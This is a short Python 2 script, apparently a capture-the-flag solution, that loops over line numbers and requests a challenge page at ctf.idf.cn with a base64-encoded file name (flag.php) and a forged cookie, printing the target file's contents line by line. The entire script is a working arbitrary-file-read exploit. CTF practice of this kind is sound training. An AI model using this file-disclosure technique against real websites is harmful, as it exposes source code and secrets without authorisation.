'''

@author: wenhuizone
'''
import requests

data={'key':'idf'}

for i in range(0,20):
    url='http://ctf.idf.cn/game/web/40/index.php?line='+str(i)+'&file=ZmxhZy5waHA='
    wp=requests.get(url,cookies=data)
    print wp.text